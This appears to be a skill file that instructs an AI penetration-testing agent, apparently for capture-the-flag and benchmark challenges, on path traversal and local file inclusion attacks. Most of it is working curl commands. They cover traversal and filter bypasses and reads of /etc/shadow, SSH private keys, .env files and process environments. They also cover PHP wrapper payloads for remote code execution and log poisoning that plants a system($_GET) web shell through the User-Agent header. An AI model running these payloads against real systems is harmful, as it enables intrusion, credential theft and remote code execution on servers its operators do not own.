---
name: lfi
description: "Path traversal and Local File Inclusion (LFI) — arbitrary file reading via directory traversal, PHP filter/input/data wrappers for RCE, log poisoning, static resource disclosure, and information leakage. Use for any challenge involving file path manipulation, ../  traversal, local file read, PHP wrappers, or sensitive file disclosure."
allowed-tools: Bash Read Write
metadata:
  subdomain: execution
  when_to_use: "lfi, local file inclusion, path traversal, directory traversal, file read, php wrapper, log poisoning, file disclosure, information_disclosure, static resource, file download, include, require, file path, dot dot slash, ../, path manipulation, poison inclusion, deprecated, php filter, php input, source code read"
  tags: web-application, lfi, path-traversal, file-inclusion, information-disclosure
  mitre_attack: T1190, T1005
---

# Path Traversal / Local File Inclusion (LFI)

Exploits insufficient path validation to read arbitrary files or include them for execution. Often targets file download/display endpoints, template inclusion, or static resource handlers.

## Precondition — Use Recon Handoff First

If the recon handoff (`recon/SUMMARY.md` `RECON_HANDOFF:` line) names a
specific file/path parameter (e.g. `/<endpoint>?file=`, `/<endpoint>?path=`,
`/<endpoint>?name=`), START with the parameter named in the handoff. Do
NOT run `gobuster`/`ffuf`/`dirb` against the host before testing the
handoff parameter — recon already enumerated the surface. The Detection
block below is for engagements where NO recon handoff exists.

The first 3 commands you run in this skill MUST target the recon-named
parameter with these payload classes (one per command):

1. plain traversal — `../../../etc/passwd`
2. stripped-traversal bypass — `....//....//....//etc/passwd`
3. PHP wrapper — `php://filter/convert.base64-encode/resource=<file>`

Only if all three return baseline-matched response (per the
§"Response Body Verification" check) should you consider broader endpoint
discovery — and that discovery belongs in `exploit/PIVOT.md` first,
documenting (a) what payload classes you tried against the handoff
parameter, (b) why the handoff vector is exhausted, (c) the new surface
you are moving to.

## Detection
```bash
# Basic path traversal probes on common parameters
for param in file name path page template doc include src resource filename load; do
  resp=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/?$param=../../../etc/passwd")
  [ "$resp" != "404" ] && echo "Param '$param' returned $resp"
done

# Test traversal depth
curl -s 'http://<TARGET>/file?name=../../../etc/passwd'
curl -s 'http://<TARGET>/file?name=../../../../etc/passwd'
curl -s 'http://<TARGET>/file?name=../../../../../etc/passwd'

# URL-encoded traversal
curl -s 'http://<TARGET>/file?name=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'

# Double URL-encoded (when server decodes twice)
curl -s 'http://<TARGET>/file?name=%252e%252e%252f%252e%252e%252fetc%252fpasswd'

# Null byte (older PHP < 5.3.4)
curl -s 'http://<TARGET>/file?name=../../../etc/passwd%00.jpg'

# Path in URL path segment
curl -s 'http://<TARGET>/static/..%2f..%2f..%2fetc/passwd'
curl -s 'http://<TARGET>/files/....//....//....//etc/passwd'
```

## Server-Level Path Traversal (Nginx Alias Off-by-Slash)

Distinct from PHP-parameter LFI: the vulnerability lives in the nginx config, not in application code. Frequently appears in production reverse-proxy / static-asset / admin-panel deployments. Test EVERY discovered URL prefix that returns a 301 redirect appending `/`, BEFORE moving to parameter fuzzing — this probe is one curl per prefix, near-zero cost, high signal.

**Fingerprint** (any of these is enough to test):
- `Server: nginx` response header
- A path `/prefix` (no trailing slash) returns 301 redirecting to `/prefix/` — canonical signature of `location /prefix` (no slash) with a separate `location /prefix/` (with slash)
- Static assets served under a path prefix (`/static`, `/assets`, `/images`, `/admin`, `/files`, `/uploads`)

**Exploit pattern** — append `../` DIRECTLY after the prefix (no slash between):

```bash
# For each prefix discovered in recon (gobuster/ffuf or 301-redirect probe):
for prefix in admin static assets images files uploads docs api; do
  STATUS=$(curl -s -o /tmp/alias_${prefix}.txt -w '%{http_code}' "http://<TARGET>/${prefix}../etc/passwd")
  SIZE=$(wc -c < /tmp/alias_${prefix}.txt)
  echo "${prefix}: status=${STATUS} size=${SIZE}"
  grep -c 'root:' /tmp/alias_${prefix}.txt
done

# Then walk parents to find sensitive files near the alias root:
PREFIX="admin"   # the winning prefix from above
for target in etc/passwd .env flag.txt flag config.php settings.py ../.env ../flag.txt; do
  curl -s "http://<TARGET>/${PREFIX}../${target}" | head -5
done
```

**Why it works**: when `location /prefix` lacks the trailing slash but `alias /target/` has one, nginx strips the URI's literal `/prefix` portion and concatenates the rest with the alias target. Request `/prefix../foo` → nginx removes `/prefix` → leaves `../foo` → resolves against `/target/` → `/target/../foo` = parent-directory access.

**Distinguishing from `root` directive**: only `alias` is affected. A `location /static { root /var/www/; }` block is NOT vulnerable to this — nginx appends the FULL request URI to the root path, so `/static../etc/passwd` yields `/var/www/static../etc/passwd` (no traversal). The 301-redirect fingerprint is the cleanest way to tell them apart without reading the config.

**Decision rule**: when LFI tag is in scope AND the server is nginx AND no PHP-parameter LFI is found, run the alias probe across EVERY discovered prefix before parameter fuzzing. The agent's pattern-completion failure mode is to recognize the nginx-alias concept but apply it only to one (often wrong) prefix — test all of them.

## Credential/Secret File Discovery
```bash
# Try all common sensitive file locations via path traversal
for f in /etc/passwd /etc/shadow /root/.ssh/id_rsa \
          /var/www/html/.env /app/.env /app/config.py /app/settings.py \
          /opt/app/config.json /srv/app/.env; do
  echo "=== $f ===" && curl -s "http://<TARGET>/file?name=../../../..$f"
done

# Also try reading from absolute path if misconfigured
for f in /.env /app/.env /var/www/html/.env /etc/passwd; do
  echo "=== direct $f ===" && curl -s "http://<TARGET>/file?name=$f"
done

# Check environment variables (if /proc accessible)
curl -s 'http://<TARGET>/file?name=../../../proc/self/environ' | tr '\0' '\n' | grep -iE 'secret|key|token|pass|cred'

# Check application config files for secrets
curl -s 'http://<TARGET>/file?name=../../../var/www/html/.env'
curl -s 'http://<TARGET>/file?name=../../../app/.env'
```

## Bypass Techniques
```bash
# If ../ is stripped once (use ....// which becomes ../ after stripping)
curl -s 'http://<TARGET>/file?name=....//....//....//etc/passwd'

# If path must start with expected directory
curl -s 'http://<TARGET>/file?name=/var/www/html/../../../etc/passwd'

# Mixed encoding
curl -s 'http://<TARGET>/file?name=..%252f..%252f..%252fetc/passwd'

# Absolute path (misconfigured path join)
curl -s 'http://<TARGET>/file?name=/etc/passwd'

# Windows paths (if Windows target)
curl -s 'http://<TARGET>/file?name=..\..\..\..\windows\win.ini'
curl -s 'http://<TARGET>/file?name=..%5c..%5c..%5cwindows%5cwin.ini'
```

## Response Body Verification (MANDATORY for path-traversal hits)

A 200 status code on a traversal request does NOT mean the file was read. Common false-success patterns:
- Web server fallback: nginx/Apache serves index.html when the requested file is not in the alias root
- Application catch-all: framework returns a default "page not found" template with 200 status
- WAF response: returns boilerplate page with 200 instead of 403

**MANDATORY verification before treating any traversal hit as success**:

```bash
# Save the suspect response
curl -s "https://<TARGET>/<traversal_path>" -o /tmp/probe.txt
SIZE=$(wc -c < /tmp/probe.txt)

# 1. Compare size to baseline (homepage / 404 page)
curl -s "https://<TARGET>/" -o /tmp/baseline.txt
BASELINE=$(wc -c < /tmp/baseline.txt)
if [ "$SIZE" = "$BASELINE" ]; then
    echo "FAIL: response size matches homepage — server is serving fallback, NOT the target file"
fi

# 2. Grep for file-format signatures (depends on what file you're reading)
grep -E '^root:x:0:0|^[a-z_-]+:[*x!]:' /tmp/probe.txt && echo "PASS: looks like /etc/passwd"
grep -E '^<\?php|^#!/' /tmp/probe.txt && echo "PASS: looks like a script source"
grep -E '^Linux|^[0-9.]+ [0-9.]+' /tmp/probe.txt && echo "PASS: looks like /proc content"
file /tmp/probe.txt | grep -v 'HTML\|empty' && echo "PASS: file(1) detected non-HTML content"

# 3. Try a known-content control file BEFORE concluding the bypass works
# /etc/hostname is short (1 line), absolutely not HTML
curl -s "https://<TARGET>/<traversal_prefix>etc/hostname" -o /tmp/hostname.txt
HOSTNAME_SIZE=$(wc -c < /tmp/hostname.txt)
if [ "$HOSTNAME_SIZE" -lt 100 ] && grep -qE '^[a-z0-9.-]+$' /tmp/hostname.txt; then
    echo "PASS: hostname read works — bypass confirmed, now retry target file"
fi
```

**Decision rule**: If suspect response size matches homepage/baseline AND no file-format signature is present, the bypass is NOT working — pivot to a different technique (PHP wrappers, log poisoning, different traversal prefix). Do NOT iterate on the same path with different filenames; the path-validation layer is winning.

**Anti-pattern**: getting a 200 with a body whose size matches the homepage on `/images../etc/passwd` (or similar nginx alias bypass) and treating it as a hit. The body bytes are homepage HTML — the alias bypass was syntactic only, not content-bearing. With this verification rule, the size match is detected in one call and the agent pivots to wrapper techniques instead of iterating filenames.

## PHP Wrappers (PHP LFI)
```bash
# Read source code via php://filter (base64-encoded output)
curl -s 'http://<TARGET>/page?file=php://filter/convert.base64-encode/resource=index.php' | base64 -d

# RCE via php://input (if allow_url_include=On)
curl -s 'http://<TARGET>/page?file=php://input' -d '<?php system("cat /.env"); ?>'

# RCE via data:// wrapper
curl -s 'http://<TARGET>/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg=='
# The base64 decodes to: <?php system("id"); ?> — replace with desired command

# Expect wrapper
curl -s 'http://<TARGET>/page?file=expect://cat+/.env'
```

## LFI to RCE via Log Poisoning
```bash
# 1. Poison Apache/Nginx access log with PHP code in User-Agent
curl -s 'http://<TARGET>/' -H 'User-Agent: <?php system($_GET["cmd"]); ?>'

# 2. Include the log file to execute injected PHP
curl -s 'http://<TARGET>/page?file=../../../var/log/apache2/access.log&cmd=cat+/.env'
curl -s 'http://<TARGET>/page?file=../../../var/log/nginx/access.log&cmd=cat+/.env'

# Alternative log paths
curl -s 'http://<TARGET>/page?file=../../../var/log/httpd/access_log&cmd=cat+/.env'
curl -s 'http://<TARGET>/page?file=../../../proc/self/fd/1&cmd=cat+/.env'
```

## LFI to RCE via /proc
```bash
# Read /proc/self/environ for env variables
curl -s 'http://<TARGET>/page?file=../../../proc/self/environ'

# If environment is readable, poison it via headers
curl -s 'http://<TARGET>/page?file=../../../proc/self/environ' \
  -H 'User-Agent: <?php system("cat /.env"); ?>'
```

## Decision Tree
```
LFI identified?
├── Can read /etc/passwd via ../ → Confirmed plain traversal
│   ├── Try sensitive files directly → /.env, /app/.env, /app/config.py
│   ├── Try env vars → /proc/self/environ | grep -iE 'secret|key|token|pass'
│   ├── PHP target → Try php://filter, php://input, data://
│   └── Try log poisoning → Inject via User-Agent, include log
├── Traversal returns 200 but NO useful content (the "protected" pattern)
│   ├── DO NOT iterate path encoding — content protection ≠ path filter
│   ├── MANDATORY: Try PHP stream wrappers FIRST:
│   │   ├── php://filter/convert.base64-encode/resource=../config.php
│   │   ├── php://filter/read=convert.base64-encode/resource=/app/config.php (absolute)
│   │   ├── php://filter/read=string.rot13/resource=../etc/shadow (encoding chain)
│   │   └── data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg== (RCE if allow_url_include)
│   ├── Then try log poisoning (Apache access.log) + include log path
│   └── Then try expect://id (if expect wrapper enabled)
└── Blocked at path-validation layer (404 or rejection)
    ├── Try encoding → URL-encode, double-encode, null byte
    ├── Try ....// → Survives single-pass stripping
    └── Try absolute path → /etc/passwd without ../
```

## Protected LFI Escalation Rule (MANDATORY)

When a challenge contains "protected", "patched", "hardened", or similar in its name/tags AND traversal returns 200 with no useful content, the protection is at the PHP-include layer. The protection class determines the bypass class — wrappers ≠ universal solution.

**Step 0 (MANDATORY before wrappers) — diagnose the protection class.**

Probe in this exact order. The first probe that returns content reveals the protection type and pins the bypass.

```bash
# Probe A — single-pattern strip filter (`str_replace('../', '', $in)`)?
# If only one pattern is stripped, `....//` collapses to `../` after one removal pass.
curl -s "http://<TARGET>/<PARAM>?<KEY>=....//....//....//etc/passwd" -o /tmp/lfi_a.txt
grep -c 'root:' /tmp/lfi_a.txt   # >=1 → Probe A wins; continue with path bypass

# Probe A2 — sequential multi-pattern strip (`str_replace(['../', './', '..\\', '.\\'], '', $in)`)?
# When Probe A returns empty or "Post not found"-style blocked response, the filter is
# likely an ARRAY of patterns applied SEQUENTIALLY (each pattern sees the residue of
# the previous pattern's removal). `....//` fails because pass-1 leaves `./` which
# pass-2 catches. Use `.....///` (5 dots + 3 slashes) — pass-1 removes `../` at offset 3
# leaving `...//`, pass-2 removes `./` at offset 2 leaving `../`, passes 3/4 (backslash
# variants) find nothing.
curl -s "http://<TARGET>/<PARAM>?<KEY>=.....///.....///.....///etc/passwd" -o /tmp/lfi_a2.txt
grep -c 'root:' /tmp/lfi_a2.txt   # >=1 → Probe A2 wins; sequential filter confirmed

# Probe B — null-byte / PHP < 5.3 truncation?
curl -s "http://<TARGET>/<PARAM>?<KEY>=../../../etc/passwd%00.png" -o /tmp/lfi_b.txt
grep -c 'root:' /tmp/lfi_b.txt   # >=1 → Probe B wins; bypass is %00 + extension append

# Probe C — wrapper acceptance (file_exists() NOT a gate)?
curl -s "http://<TARGET>/<PARAM>?<KEY>=php://filter/convert.base64-encode/resource=index.php" \
  -o /tmp/lfi_c.txt
[ -s /tmp/lfi_c.txt ] && base64 -d /tmp/lfi_c.txt 2>/dev/null | head -3   # non-empty → Probe C wins; wrappers viable
```

**Branch by winner:**

- **Probe A wins (single-pattern collapse)** — `....//` strips to `../` per stripping pass. Target the flag DIRECTLY: `curl 'http://<TARGET>/<PARAM>?<KEY>=....//....//....//<FLAG_FILE_GUESS>'` where `<FLAG_FILE_GUESS>` comes from the benchmark skill if BENCHMARK_MODE=1, otherwise `/etc/passwd` to confirm primitive then app-config files. Do NOT try wrappers — they will silently fail because `file_exists()` is the gate.
- **Probe A2 wins (sequential array collapse)** — `.....///` survives the cascading multi-pattern strip. Target the flag with the SAME depth as Probe A: `curl 'http://<TARGET>/<PARAM>?<KEY>=.....///.....///.....///<FLAG_FILE_GUESS>'`. Count directories between the include base path and the target file; one `.....///` per level. Wrappers will also silently fail under this filter.
- **Probe B wins (null-byte)** — append `%00<expected_ext>` (e.g., `%00.png`, `%00.html`) to any path. Works on PHP < 5.3 with magic_quotes_gpc off.
- **Probe C wins (wrappers accepted)** — proceed to the wrapper escalation list below.
- **All probes return same blank response** — protection is at `realpath()` or `open_basedir`. ONLY then proceed to wrapper escalation; if wrappers also fail, pivot to log poisoning.

**Wrapper escalation (only when Probe C wins or all probes blank):**

**STEP W1 (MANDATORY — wrapper availability gate)**: Before ANY traversal-wrapper combo, confirm wrappers are accepted using a **known-good resource WITHOUT traversal**. Use the original whitelisted filename or `index.php`. A 200 response with a clean baseline (not the blocked "no post"/"not found" template) and decodable base64 output proves wrappers work. If this baseline returns the SAME blocked response as the original request, wrappers are off at the PHP layer (`allow_url_fopen=Off` or filter strips `php://`) — **DO NOT iterate wrappers; jump to STEP W5 (log poisoning)**.

```bash
# STEP W1 — wrapper availability gate (no traversal)
# CRITICAL: send the wrapper as a RAW query string. Never use --data-urlencode
# for php:// URLs — it percent-encodes `:` and `/` into `%3A%2F%2F`, which the
# filter blocks at the string-match layer before PHP even sees it, producing
# a guaranteed false negative ("wrappers blocked" when wrappers actually work).
WHITELISTED="<known_good_filename.php>"   # e.g. ScriptKiddie.php, index.php
curl -sS "http://<TARGET>/<PARAM>?<KEY>=php://filter/convert.base64-encode/resource=${WHITELISTED}" \
  -o /tmp/w1.txt
[ -s /tmp/w1.txt ] && base64 -d /tmp/w1.txt 2>/dev/null | head -3   # readable PHP/HTML → wrappers OK

# Wrong forms that produce false negatives:
# curl ... --data-urlencode "id=php://filter/..."          # encodes `://` → blocked
# curl ... -G --data-urlencode "id=php://filter/..."       # same
# curl ... -d "id=php%3A%2F%2Ffilter%2F..."                # pre-encoded → same
```

If decodable PHP/HTML appears → wrappers OK → proceed to W2-W4. If output matches the blocked baseline byte-for-byte (`cmp /tmp/w1.txt /tmp/baseline_blocked.txt`) → wrappers BLOCKED → skip W2-W4 and jump to W5.

1. **STEP W2** — `php://filter/convert.base64-encode/resource=../config.php` (and other relative/absolute target paths) — bypasses content filters by reading file as base64 stream
2. **STEP W3** — `php://filter/read=string.rot13/resource=...` — alternate encoding to defeat output sanitization
3. **STEP W4** — Filter chains: `php://filter/read=convert.base64-encode|string.rot13/resource=...` and `data://text/plain;base64,<PHP_PAYLOAD_B64>` (only if `allow_url_include=On`)
4. **STEP W5 (MANDATORY when W1 fails OR W2-W4 do not yield flag) — log poisoning**. Wrapper-agnostic: survives `allow_url_fopen=Off`.
   ```bash
   # Poison Apache/Nginx access log via User-Agent injection
   curl -s "http://<TARGET>/" -H 'User-Agent: <?php system($_GET["c"]); ?>'
   # Include the log via LFI traversal — chain with whichever bypass won Probe A/B
   curl -s "http://<TARGET>/<PARAM>?<KEY>=....//....//....//var/log/apache2/access.log&c=cat+/FLAG.php"
   curl -s "http://<TARGET>/<PARAM>?<KEY>=../../../var/log/nginx/access.log&c=id"
   # Also try: /var/log/apache2/error.log, /var/log/httpd/access_log, /tmp/sess_<PHPSESSID>
   ```
5. **STEP W6** — session-file poisoning when log paths inaccessible: PHP serializes sessions to `/var/lib/php/sessions/sess_<PHPSESSID>`. Inject PHP into a session-stored field (username, search-history), then include the session file.

**Critical pin**: If `post.php` (or equivalent) source shows `if (file_exists($file)) { include($file); }`, wrappers are dead by design — `file_exists()` returns false for `php://`, `data://`, `expect://` on default PHP. Step 0 Probe A or B must win, OR the bypass is a real-file path like log poisoning where the log file actually exists on disk.

```bash
# Wrapper escalation examples — replace <TARGET_FILE> with the app's config/source file
TARGET_FILE="config.php"
curl -s "http://<TARGET>/page?id=php://filter/convert.base64-encode/resource=../$TARGET_FILE" | base64 -d
curl -s "http://<TARGET>/page?id=php://filter/read=convert.base64-encode/resource=/app/$TARGET_FILE" | base64 -d
curl -s "http://<TARGET>/page?id=php://filter/read=string.rot13/resource=../$TARGET_FILE" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

**Pivot discipline**: After confirming traversal-syntax-works-no-content, the next move is wrappers — not more encoding variants on the same broken traversal. If wrappers also fail to return interpretable content, pivot to log poisoning. Encoding/CVE iteration on a syntactically-working-but-content-blocked traversal does not change the underlying block.

**Anti-pattern**: Spending the dispatch on path/encoding/CVE variants after diagnosing content-protection, never trying wrappers. With this rule the wrapper is the 1st post-diagnosis attempt.
